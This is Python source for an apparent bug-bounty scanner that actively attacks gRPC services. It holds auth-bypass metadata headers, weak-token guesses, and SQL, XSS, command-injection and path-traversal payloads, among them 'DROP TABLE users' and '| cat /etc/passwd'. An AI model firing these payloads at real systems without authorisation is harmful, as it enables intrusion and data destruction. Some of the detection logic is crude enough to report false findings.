"""
gRPC Security Tester Agent

Comprehensive gRPC security testing agent.

Tests for:
- Server reflection API abuse
- Authentication bypass via metadata injection
- Protobuf message tampering and injection
- Stream hijacking (client/server/bidirectional)
- Information disclosure in error messages
- Weak authentication tokens
- Missing authorization on methods

Real-world examples:
- DoorDash GraphQL→gRPC gateway bypass (2026-02-07)
- 29 mutations reached backend without auth
- gRPC errors (INVALID_ARGUMENT) proved backend access

Author: BountyHound Team
Version: 3.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import grpc
import time
import json
import re
import socket
import ssl
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from engine.core.db_hooks import DatabaseHooks
from engine.core.database import BountyHoundDB
from engine.core.payload_hooks import PayloadHooks



class GrpcSecurityLevel(Enum):
    """Security assessment levels"""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


class GrpcAuthType(Enum):
    """gRPC authentication types"""
    NONE = "none"
    API_KEY = "api_key"
    JWT = "jwt"
    OAUTH2 = "oauth2"
    MTLS = "mtls"
    CUSTOM = "custom"


@dataclass
class GrpcService:
    """gRPC service definition"""
    name: str
    methods: List[str] = field(default_factory=list)
    full_name: str = ""
    file_descriptor: Optional[Any] = None
    dependencies: List[str] = field(default_factory=list)


@dataclass
class GrpcMethod:
    """gRPC method details"""
    service: str
    name: str
    full_name: str
    input_type: str
    output_type: str
    client_streaming: bool = False
    server_streaming: bool = False
    input_message: Optional[Any] = None
    output_message: Optional[Any] = None


@dataclass
class GrpcVulnerability:
    """gRPC vulnerability finding"""
    vuln_id: str
    severity: GrpcSecurityLevel
    title: str
    description: str
    service: str
    method: str
    evidence: Dict[str, Any]
    remediation: str
    cwe: str = ""
    cvss_score: float = 0.0
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            'vuln_id': self.vuln_id,
            'severity': self.severity.value,
            'title': self.title,
            'description': self.description,
            'service': self.service,
            'method': self.method,
            'evidence': self.evidence,
            'remediation': self.remediation,
            'cwe': self.cwe,
            'cvss_score': self.cvss_score,
            'timestamp': self.timestamp
        }


class GrpcSecurityTester:
    """
    Advanced gRPC security testing agent

    Tests gRPC services for:
    - Reflection API abuse
    - Authentication bypass
    - Message tampering
    - Information disclosure
    - Stream hijacking
    """

    def __init__(self, target: str, port: int = 443, use_tls: bool = True):
        """
        Initialize gRPC security tester.

        Args:
            target: Target hostname
            port: gRPC port (default 443)
            use_tls: Use TLS connection (default True)
        """
        self.target = target
        self.port = port
        self.use_tls = use_tls
        self.services: Dict[str, GrpcService] = {}
        self.methods: List[GrpcMethod] = []
        self.vulnerabilities: List[GrpcVulnerability] = []
        self.db = BountyHoundDB()

        # Database check before testing
        self.db_context = DatabaseHooks.before_test(target, 'grpc_security_tester')

    def run_comprehensive_test(self) -> Dict[str, Any]:
        """Execute full gRPC security assessment"""
        # Check if we should skip
        if self.db_context['should_skip']:
            print(f"⚠️  SKIP: {self.db_context['reason']}")
            return {
                'target': f"{self.target}:{self.port}",
                'skipped': True,
                'reason': self.db_context['reason'],
                'previous_findings': self.db_context['previous_findings']
            }

        print(f"🔐 gRPC Security Testing: {self.target}:{self.port}")
        print("=" * 60)

        start_time = time.time()
        results = {
            "target": f"{self.target}:{self.port}",
            "timestamp": time.time(),
            "tests_run": [],
            "vulnerabilities": [],
            "services_found": 0,
            "methods_found": 0
        }

        # Phase 1: Discovery
        print("[*] Phase 1: gRPC Endpoint Discovery")
        if self.discover_grpc_endpoint():
            results["tests_run"].append("endpoint_discovery")
            print(f"[+] Confirmed gRPC service at {self.target}:{self.port}")
        else:
            print("[-] Target does not appear to be a gRPC service")
            return results

        # Phase 2: Reflection API
        print("\n[*] Phase 2: Server Reflection Testing")
        if self.test_reflection_api():
            results["tests_run"].append("reflection_api")
            results["services_found"] = len(self.services)
            results["methods_found"] = len(self.methods)
            print(f"[+] Discovered {len(self.services)} services, {len(self.methods)} methods")
        else:
            print("[-] Reflection API not enabled or not accessible")

        # Phase 3: Authentication Testing
        print("\n[*] Phase 3: Authentication Analysis")
        auth_vulns = self.test_authentication()
        results["tests_run"].append("authentication")
        self.vulnerabilities.extend(auth_vulns)
        print(f"[+] Found {len(auth_vulns)} authentication issues")

        # Phase 4: Message Tampering
        print("\n[*] Phase 4: Message Tampering Tests")
        tampering_vulns = self.test_message_tampering()
        results["tests_run"].append("message_tampering")
        self.vulnerabilities.extend(tampering_vulns)
        print(f"[+] Found {len(tampering_vulns)} tampering vulnerabilities")

        # Phase 5: Stream Security
        print("\n[*] Phase 5: Stream Security Testing")
        stream_vulns = self.test_stream_security()
        results["tests_run"].append("stream_security")
        self.vulnerabilities.extend(stream_vulns)
        print(f"[+] Found {len(stream_vulns)} stream vulnerabilities")

        # Phase 6: Error Analysis
        print("\n[*] Phase 6: Error Information Disclosure")
        error_vulns = self.test_error_disclosure()
        results["tests_run"].append("error_analysis")
        self.vulnerabilities.extend(error_vulns)
        print(f"[+] Found {len(error_vulns)} information disclosure issues")

        # Compile results
        results["vulnerabilities"] = [v.to_dict() for v in self.vulnerabilities]

        # Record in database
        duration = int(time.time() - start_time)
        self.db.record_tool_run(
            domain=self.target,
            tool_name='grpc_security_tester',
            findings_count=len(self.vulnerabilities),
            duration_seconds=duration
        )

        # Record findings
        for vuln in self.vulnerabilities:
            self.db.record_finding(
                domain=self.target,
                vuln_type=vuln.vuln_id,
                severity=vuln.severity.value,
                title=vuln.title,
                description=vuln.description,
                evidence=vuln.evidence
            )

        print(f"\n{'='*60}")
        print(f"✅ gRPC Security Test Complete in {duration}s")
        print(f"   Total vulnerabilities: {len(self.vulnerabilities)}")
        print(f"{'='*60}")

        return results

    def discover_grpc_endpoint(self) -> bool:
        """Detect gRPC service via HTTP/2 fingerprinting"""
        try:
            # Method 1: Check for HTTP/2 with ALPN
            context = ssl.create_default_context()
            context.set_alpn_protocols(['h2'])

            with socket.create_connection((self.target, self.port), timeout=5) as sock:
                if self.use_tls:
                    with context.wrap_socket(sock, server_hostname=self.target) as ssock:
                        protocol = ssock.selected_alpn_protocol()
                        if protocol == 'h2':
                            return True
                else:
                    # Send HTTP/2 connection preface
                    preface = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
                    sock.send(preface)
                    response = sock.recv(1024)
                    if response:
                        return True

            # Method 2: Try gRPC channel creation
            channel = self.create_channel()
            if channel:
                channel.close()
                return True

            return False

        except Exception as e:
            print(f"[!] Discovery error: {e}")
            return False

    def create_channel(self, metadata: Optional[List[Tuple[str, str]]] = None) -> grpc.Channel:
        """Create gRPC channel with optional metadata"""
        target_str = f"{self.target}:{self.port}"

        try:
            if self.use_tls:
                credentials = grpc.ssl_channel_credentials()
                channel = grpc.secure_channel(target_str, credentials)
            else:
                channel = grpc.insecure_channel(target_str)

            return channel
        except Exception as e:
            print(f"[!] Channel creation error: {e}")
            return None

    def test_reflection_api(self) -> bool:
        """Extract service definitions via reflection"""
        try:
            # Import reflection modules only when needed
            try:
                import grpc.reflection.v1alpha.reflection_pb2 as reflection_pb2
                import grpc.reflection.v1alpha.reflection_pb2_grpc as reflection_pb2_grpc
            except ImportError:
                print("[-] grpcio-reflection not installed, skipping reflection tests")
                return False

            channel = self.create_channel()
            if not channel:
                return False

            stub = reflection_pb2_grpc.ServerReflectionStub(channel)

            # List all services
            request = reflection_pb2.ServerReflectionRequest(list_services="")

            try:
                responses = stub.ServerReflectionInfo(iter([request]), timeout=10)
                response = next(responses)

                if response.HasField('list_services_response'):
                    service_count = 0
                    for service in response.list_services_response.service:
                        service_name = service.name

                        # Skip reflection service itself
                        if 'ServerReflection' in service_name:
                            continue

                        service_count += 1
                        print(f"[+] Found service: {service_name}")

                        # Create service entry
                        grpc_service = GrpcService(
                            name=service_name.split('.')[-1],
                            full_name=service_name
                        )

                        # Store basic service info (full descriptor parsing requires protobuf)
                        self.services[service_name] = grpc_service

                    # Check if reflection enabled = vulnerability
                    if service_count > 0:
                        self.vulnerabilities.append(GrpcVulnerability(
                            vuln_id="GRPC-REFLECTION-001",
                            severity=GrpcSecurityLevel.MEDIUM,
                            title="gRPC Server Reflection Enabled",
                            description="Server reflection API is enabled, allowing attackers to enumerate all services and methods without authentication.",
                            service="grpc.reflection.v1alpha.ServerReflection",
                            method="ServerReflectionInfo",
                            evidence={
                                "services_exposed": [s.name for s in self.services.values()],
                                "service_count": service_count,
                                "recommendation": "Disable reflection in production"
                            },
                            remediation="Disable server reflection in production environments. Only enable for development/testing.",
                            cwe="CWE-215",
                            cvss_score=5.3
                        ))

                    return True

            except grpc.RpcError as e:
                if e.code() == grpc.StatusCode.UNIMPLEMENTED:
                    print("[-] Reflection API not implemented")
                else:
                    print(f"[-] Reflection error: {e.code()}")
                return False

        except Exception as e:
            print(f"[!] Reflection test error: {e}")
            return False
        finally:
            if channel:
                channel.close()

    def test_authentication(self) -> List[GrpcVulnerability]:
        """Test authentication mechanisms"""
        vulnerabilities = []

        # Create some common test methods if reflection didn't work
        if not self.methods:
            # Create dummy methods for common service patterns
            test_methods = [
                GrpcMethod(
                    service="user.UserService",
                    name="GetUser",
                    full_name="user.UserService/GetUser",
                    input_type=".user.GetUserRequest",
                    output_type=".user.User"
                ),
                GrpcMethod(
                    service="user.UserService",
                    name="DeleteUser",
                    full_name="user.UserService/DeleteUser",
                    input_type=".user.DeleteUserRequest",
                    output_type=".user.DeleteResponse"
                ),
            ]
        else:
            test_methods = self.methods[:5]  # Test first 5 discovered methods

        for method in test_methods:
            # Test 1: No authentication
            vuln = self.test_unauthenticated_access(method)
            if vuln:
                vulnerabilities.append(vuln)

            # Test 2: Weak authentication
            weak_vulns = self.test_weak_auth(method)
            vulnerabilities.extend(weak_vulns)

            # Test 3: Auth bypass via metadata manipulation
            bypass_vulns = self.test_auth_bypass(method)
            vulnerabilities.extend(bypass_vulns)

        return vulnerabilities

    def test_unauthenticated_access(self, method: GrpcMethod) -> Optional[GrpcVulnerability]:
        """Test if method accessible without auth"""
        try:
            channel = self.create_channel()
            if not channel:
                return None

            # Build generic request
            request_data = self.build_generic_request(method.input_type)

            # Make unauthenticated call
            response = channel.unary_unary(
                f"/{method.full_name}",
                request_serializer=lambda x: x,
                response_deserializer=lambda x: x
            )(request_data, timeout=5)

            # If we get a response (not UNAUTHENTICATED error), it's vulnerable
            channel.close()
            return GrpcVulnerability(
                vuln_id=f"GRPC-AUTH-{method.name[:4].upper()}",
                severity=GrpcSecurityLevel.HIGH,
                title=f"Unauthenticated Access to {method.name}",
                description=f"The gRPC method {method.full_name} is accessible without any authentication.",
                service=method.service,
                method=method.name,
                evidence={
                    "request_type": method.input_type,
                    "response_received": True,
                    "error_code": None
                },
                remediation="Implement authentication checks for all sensitive gRPC methods.",
                cwe="CWE-306",
                cvss_score=7.5
            )

        except grpc.RpcError as e:
            if e.code() == grpc.StatusCode.UNAUTHENTICATED:
                # Expected - auth is required
                return None
            elif e.code() in [grpc.StatusCode.INVALID_ARGUMENT, grpc.StatusCode.NOT_FOUND]:
                # Method reachable but bad request = potential vuln
                return GrpcVulnerability(
                    vuln_id=f"GRPC-AUTH-WEAK-{method.name[:4].upper()}",
                    severity=GrpcSecurityLevel.MEDIUM,
                    title=f"Weak Authentication on {method.name}",
                    description=f"Method returns input validation error before auth check, indicating authentication runs after business logic.",
                    service=method.service,
                    method=method.name,
                    evidence={
                        "error_code": e.code().name,
                        "error_details": e.details()
                    },
                    remediation="Move authentication checks before input validation.",
                    cwe="CWE-696",
                    cvss_score=5.3
                )
        except Exception:
            pass
        finally:
            if channel:
                channel.close()

        return None

    def test_weak_auth(self, method: GrpcMethod) -> List[GrpcVulnerability]:
        """Test for weak authentication patterns"""
        vulnerabilities = []

        weak_tokens = [
            ("authorization", "Bearer test"),
            ("authorization", "Bearer 123456"),
            ("api-key", "test"),
            ("x-api-key", "admin"),
            ("token", ""),
            ("user-id", "1"),
        ]

        for header, value in weak_tokens:
            try:
                channel = self.create_channel()
                if not channel:
                    continue

                metadata = [(header, value)]
                request_data = self.build_generic_request(method.input_type)

                response = channel.unary_unary(
                    f"/{method.full_name}",
                    request_serializer=lambda x: x,
                    response_deserializer=lambda x: x
                )(request_data, metadata=metadata, timeout=5)

                # If accepted, weak auth
                channel.close()
                vulnerabilities.append(GrpcVulnerability(
                    vuln_id=f"GRPC-WEAK-{header.upper().replace('-', '_')}",
                    severity=GrpcSecurityLevel.CRITICAL,
                    title=f"Weak Authentication Token Accepted",
                    description=f"Method accepts weak/test authentication token in {header} header.",
                    service=method.service,
                    method=method.name,
                    evidence={
                        "header": header,
                        "value": value,
                        "accepted": True
                    },
                    remediation="Implement strong token validation. Never accept hardcoded or test credentials.",
                    cwe="CWE-798",
                    cvss_score=9.1
                ))

            except grpc.RpcError:
                continue
            except Exception:
                continue
            finally:
                if channel:
                    channel.close()

        return vulnerabilities

    def test_auth_bypass(self, method: GrpcMethod) -> List[GrpcVulnerability]:
        """Test authentication bypass techniques"""
        vulnerabilities = []

        # Test metadata manipulation
        bypass_attempts = [
            [("x-forwarded-for", "127.0.0.1")],
            [("x-real-ip", "localhost")],
            [("x-user-id", "admin")],
            [("grpc-internal", "true")],
            [("x-authenticated", "true")],
            [("service-to-service", "true")],
        ]

        for metadata in bypass_attempts:
            try:
                channel = self.create_channel()
                if not channel:
                    continue

                request_data = self.build_generic_request(method.input_type)

                response = channel.unary_unary(
                    f"/{method.full_name}",
                    request_serializer=lambda x: x,
                    response_deserializer=lambda x: x
                )(request_data, metadata=metadata, timeout=5)

                channel.close()
                vulnerabilities.append(GrpcVulnerability(
                    vuln_id=f"GRPC-BYPASS-{metadata[0][0].upper().replace('-', '_')}",
                    severity=GrpcSecurityLevel.CRITICAL,
                    title="Authentication Bypass via Metadata Injection",
                    description=f"Authentication can be bypassed by injecting metadata header: {metadata[0][0]}",
                    service=method.service,
                    method=method.name,
                    evidence={
                        "bypass_metadata": dict(metadata),
                        "success": True
                    },
                    remediation="Never trust client-provided authentication metadata. Validate all auth tokens cryptographically.",
                    cwe="CWE-287",
                    cvss_score=9.8
                ))

            except grpc.RpcError:
                continue
            except Exception:
                continue
            finally:
                if channel:
                    channel.close()

        return vulnerabilities

    def test_message_tampering(self) -> List[GrpcVulnerability]:
        """Test protobuf message tampering"""
        vulnerabilities = []

        # Get proven injection payloads from database
        sql_payloads = PayloadHooks.get_successful_payloads('SQL_INJECTION')
        xss_payloads = PayloadHooks.get_successful_payloads('XSS')

        # Use database payloads if available, otherwise use defaults
        injection_payloads = {
            "sql": [p['payload'] for p in sql_payloads] if sql_payloads else ["' OR '1'='1", "1; DROP TABLE users--"],
            "xss": [p['payload'] for p in xss_payloads] if xss_payloads else ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
            "command": ["; ls", "| cat /etc/passwd", "&& whoami"],
            "path_traversal": ["../../../etc/passwd", "..\\..\\windows\\win.ini"],
        }

        # Limit method testing to avoid excessive requests
        test_methods = self.methods[:3] if self.methods else []

        for method in test_methods:
            for attack_type, payloads in injection_payloads.items():
                vuln = self.test_injection(method, attack_type, payloads[:2])  # Test first 2 payloads
                if vuln:
                    vulnerabilities.append(vuln)

        return vulnerabilities

    def test_injection(self, method: GrpcMethod, attack_type: str, payloads: List[str]) -> Optional[GrpcVulnerability]:
        """Test injection attacks"""
        for payload in payloads:
            try:
                channel = self.create_channel()
                if not channel:
                    continue

                # Build request with injection payload
                request_data = self.build_injection_request(method.input_type, payload)

                response = channel.unary_unary(
                    f"/{method.full_name}",
                    request_serializer=lambda x: x,
                    response_deserializer=lambda x: x
                )(request_data, timeout=5)

                # Check response for injection success indicators
                response_str = str(response)

                success_indicators = {
                    "sql": ["syntax error", "mysql", "postgresql", "ORA-"],
                    "command": ["root:", "uid=", "Administrator"],
                    "path_traversal": ["root:", "[boot loader]"],
                }

                if attack_type in success_indicators:
                    for indicator in success_indicators[attack_type]:
                        if indicator.lower() in response_str.lower():
                            channel.close()
                            return GrpcVulnerability(
                                vuln_id=f"GRPC-INJ-{attack_type.upper()}",
                                severity=GrpcSecurityLevel.CRITICAL,
                                title=f"{attack_type.upper()} Injection in gRPC Method",
                                description=f"The method {method.name} is vulnerable to {attack_type} injection attacks.",
                                service=method.service,
                                method=method.name,
                                evidence={
                                    "payload": payload,
                                    "response_indicator": indicator,
                                    "injection_type": attack_type
                                },
                                remediation="Implement input validation and parameterized queries. Never trust client input.",
                                cwe="CWE-89" if attack_type == "sql" else "CWE-78",
                                cvss_score=9.8
                            )

            except grpc.RpcError as e:
                # Check error message for injection indicators
                if e.details():
                    for indicator in ["syntax", "error", "exception", "stack"]:
                        if indicator in e.details().lower():
                            return GrpcVulnerability(
                                vuln_id=f"GRPC-ERR-{attack_type.upper()}",
                                severity=GrpcSecurityLevel.HIGH,
                                title=f"Error-Based {attack_type} Injection",
                                description=f"Injection payload triggers detailed error messages.",
                                service=method.service,
                                method=method.name,
                                evidence={
                                    "payload": payload,
                                    "error": e.details()[:200]
                                },
                                remediation="Sanitize error messages. Implement proper input validation.",
                                cwe="CWE-209",
                                cvss_score=6.5
                            )
            except Exception:
                continue
            finally:
                if channel:
                    channel.close()

        return None

    def test_stream_security(self) -> List[GrpcVulnerability]:
        """Test streaming RPC security"""
        vulnerabilities = []

        streaming_methods = [m for m in self.methods if m.client_streaming or m.server_streaming]

        for method in streaming_methods:
            # Test stream hijacking
            if method.server_streaming:
                vuln = self.test_stream_hijacking(method)
                if vuln:
                    vulnerabilities.append(vuln)

            # Test stream injection
            if method.client_streaming:
                vuln = self.test_stream_injection(method)
                if vuln:
                    vulnerabilities.append(vuln)

        return vulnerabilities

    def test_stream_hijacking(self, method: GrpcMethod) -> Optional[GrpcVulnerability]:
        """Test server streaming hijacking"""
        try:
            channel = self.create_channel()
            if not channel:
                return None

            request_data = self.build_generic_request(method.input_type)

            # Attempt to receive stream without auth
            stream = channel.unary_stream(
                f"/{method.full_name}",
                request_serializer=lambda x: x,
                response_deserializer=lambda x: x
            )(request_data, timeout=10)

            messages = []
            for response in stream:
                messages.append(response)
                if len(messages) >= 3:
                    break

            if messages:
                channel.close()
                return GrpcVulnerability(
                    vuln_id=f"GRPC-STREAM-HIJACK",
                    severity=GrpcSecurityLevel.HIGH,
                    title="Unauthenticated Stream Access",
                    description=f"Server streaming method {method.name} allows unauthenticated access to data stream.",
                    service=method.service,
                    method=method.name,
                    evidence={
                        "messages_received": len(messages),
                        "stream_type": "server_streaming"
                    },
                    remediation="Implement authentication for streaming methods. Validate on every message.",
                    cwe="CWE-306",
                    cvss_score=7.5
                )

        except grpc.RpcError:
            pass
        except Exception:
            pass
        finally:
            if channel:
                channel.close()

        return None

    def test_stream_injection(self, method: GrpcMethod) -> Optional[GrpcVulnerability]:
        """Test client streaming injection"""
        try:
            channel = self.create_channel()
            if not channel:
                return None

            # Send stream with malicious messages
            def request_generator():
                for i in range(3):
                    yield self.build_injection_request(method.input_type, f"'; DROP TABLE users--{i}")

            response = channel.stream_unary(
                f"/{method.full_name}",
                request_serializer=lambda x: x,
                response_deserializer=lambda x: x
            )(request_generator(), timeout=10)

            # If stream accepted without validation
            channel.close()
            return GrpcVulnerability(
                vuln_id=f"GRPC-STREAM-INJ",
                severity=GrpcSecurityLevel.HIGH,
                title="Client Stream Injection Vulnerability",
                description=f"Client streaming method {method.name} processes injected messages without validation.",
                service=method.service,
                method=method.name,
                evidence={
                    "stream_type": "client_streaming",
                    "injection_accepted": True
                },
                remediation="Validate every message in client streams. Implement rate limiting.",
                cwe="CWE-20",
                cvss_score=7.5
            )

        except grpc.RpcError:
            pass
        except Exception:
            pass
        finally:
            if channel:
                channel.close()

        return None

    def test_error_disclosure(self) -> List[GrpcVulnerability]:
        """Test for information disclosure in errors"""
        vulnerabilities = []

        test_methods = self.methods[:5] if self.methods else []

        for method in test_methods:
            try:
                channel = self.create_channel()
                if not channel:
                    continue

                # Send malformed request to trigger error
                malformed_data = b"\x00\x01\x02\x03\x04"

                response = channel.unary_unary(
                    f"/{method.full_name}",
                    request_serializer=lambda x: x,
                    response_deserializer=lambda x: x
                )(malformed_data, timeout=5)

            except grpc.RpcError as e:
                # Check for sensitive information in error
                details = e.details() if e.details() else ""

                sensitive_patterns = [
                    (r"/home/\w+/", "file_path"),
                    (r"C:\\Users\\\w+", "file_path"),
                    (r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", "ip_address"),
                    (r"password", "credential"),
                    (r"secret", "secret"),
                    (r"token", "token"),
                    (r"at \w+\.\w+\.\w+\(", "stack_trace"),
                ]

                for pattern, info_type in sensitive_patterns:
                    if re.search(pattern, details, re.IGNORECASE):
                        vulnerabilities.append(GrpcVulnerability(
                            vuln_id=f"GRPC-INFO-{info_type.upper()}",
                            severity=GrpcSecurityLevel.LOW,
                            title=f"Information Disclosure in Error Messages",
                            description=f"gRPC error messages expose {info_type} information.",
                            service=method.service,
                            method=method.name,
                            evidence={
                                "info_type": info_type,
                                "pattern_matched": pattern,
                                "error_details": details[:200]
                            },
                            remediation="Sanitize error messages. Return generic errors to clients.",
                            cwe="CWE-209",
                            cvss_score=3.7
                        ))
                        break

            except Exception:
                continue
            finally:
                if channel:
                    channel.close()

        return vulnerabilities

    def build_generic_request(self, message_type: str) -> bytes:
        """Build generic protobuf request"""
        # Return minimal valid protobuf message
        # Field 1 (varint): 0
        # Field 2 (string): "test"
        return b"\x08\x00\x12\x04test"

    def build_injection_request(self, message_type: str, payload: str) -> bytes:
        """Build protobuf request with injection payload"""
        # Encode payload as string in field 2
        payload_bytes = payload.encode('utf-8')
        length = len(payload_bytes)

        # Protobuf wire format: field 2, wire type 2 (length-delimited)
        field_tag = (2 << 3) | 2
        return bytes([field_tag, length]) + payload_bytes

    def generate_report(self, output_file: str):
        """Generate comprehensive security report"""
        report = {
            "target": f"{self.target}:{self.port}",
            "scan_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "services": len(self.services),
            "methods": len(self.methods),
            "vulnerabilities": {
                "critical": len([v for v in self.vulnerabilities if v.severity == GrpcSecurityLevel.CRITICAL]),
                "high": len([v for v in self.vulnerabilities if v.severity == GrpcSecurityLevel.HIGH]),
                "medium": len([v for v in self.vulnerabilities if v.severity == GrpcSecurityLevel.MEDIUM]),
                "low": len([v for v in self.vulnerabilities if v.severity == GrpcSecurityLevel.LOW]),
                "info": len([v for v in self.vulnerabilities if v.severity == GrpcSecurityLevel.INFO]),
            },
            "findings": [v.to_dict() for v in sorted(self.vulnerabilities, key=lambda x: x.cvss_score, reverse=True)]
        }

        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)

        print(f"\n[+] Report saved to: {output_file}")


# Example usage
if __name__ == "__main__":
    # Test gRPC service
    tester = GrpcSecurityTester(
        target="grpc.example.com",
        port=443,
        use_tls=True
    )

    results = tester.run_comprehensive_test()
    tester.generate_report("grpc-security-report.json")

    print(f"\n{'='*60}")
    print(f"gRPC Security Test Complete")
    print(f"{'='*60}")
    print(f"Services discovered: {results.get('services_found', 0)}")
    print(f"Methods discovered: {results.get('methods_found', 0)}")
    print(f"Vulnerabilities: {len(results.get('vulnerabilities', []))}")
